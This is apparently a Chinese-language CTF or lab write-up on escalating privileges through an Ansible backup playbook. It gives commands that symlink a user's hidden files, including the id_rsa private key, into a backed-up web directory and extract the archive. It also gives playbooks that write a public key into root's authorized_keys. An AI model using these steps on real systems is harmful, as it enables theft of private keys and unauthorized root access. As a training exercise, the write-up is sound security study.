在目录/opt/backups/playbook中，找到了一个rum.yml文件，咱们见到比对一下配置文件，详细配置说明在https://blog.csdn.net/weiguang1017/article/details/52998710 

```
\- hosts: localhost#主机列表
  tasks:#任务列表
  \- name: Copy Files#任务名：复制文件 将src 复制到dest文件 copy\_links=yes复制符号链接，是映射的（源）文件复制
    synchronize: src\=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest\=/opt/backups/files copy\_links\=yes
  \- name: Server Backups#任务名：服务备份 把path 配分到 dest
    archive:#模块
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible\_date\_time.date}}-{{ansible\_date\_time.time}}.gz"
  \- name: Clean #任务名；清理 sahn
    file:#模块
      state: absent#删除目录、文件或者取消链接文件
      path: /opt/backups/files/
```

简单说就是把src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard文件打包到/opt/backups/archives/，查看一下这个目录

![](../Images/bb297b1977dc86df496259e59de73378.png)

![](../Images/5658bd79a27e8eb1b8b2f7861970b521.png)

可以发现备份文件的时间和当前打印的时间基本一致，可以自启动任务运行，根据解读run.yml文件的规则，可以将想要看的而且权限够的文件创建一个软连接，到src中，我们当前假设咱们可以创建一个指向luis的id\_rsa的链接，我们可以把它放到/uploads目录中

```
ln \-s /home/luis/.\* /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
cp /opt/backups/archives/backup-2021-10-21-06:50:32.gz /tmp/backup.gz
tar \-xvf /tmp/backup.gz
```

执行第一条命令后可以看到下图，文件已经成功备份。但是我忘了luis用户下有一个50M的war包。删除几个大文件，重新将隐藏文件链接![](../Images/fc077a871ad194507f2cf377e84e5006.png)

### **扩展**  

##### 写入公钥

```
\- name: 利用命令写入authorized\_keys
  hosts: localhost
  tasks:
    \- name: mkdir /root/.ssh
        command: mkdir /root/.ssh
    \- name: chmod 
        command: chmod 600 /root/.ssh
    \- name: copying file with playbook
      become: true 
      copy:
        src: /home/luis/id\_rsa.pub
        dest: /root/.ssh/authorized\_keys
        owner: root
        group: root        
        mode: 0600

```

```
\- name: 写入authorized\_keys
  hosts: localhost
  tasks:
    \- name: mkdir /root/.ssh
      file:
        path: /root/.ssh
        state: directory
        owner: root
        group: root        
        mode: 0600
    \- name: Copy
      become: true 
      copy:
        src: /home/luis/id\_rsa.pub
        dest: /root/.ssh/authorized\_keys
        owner: root
        group: root        
        mode: 0600
```
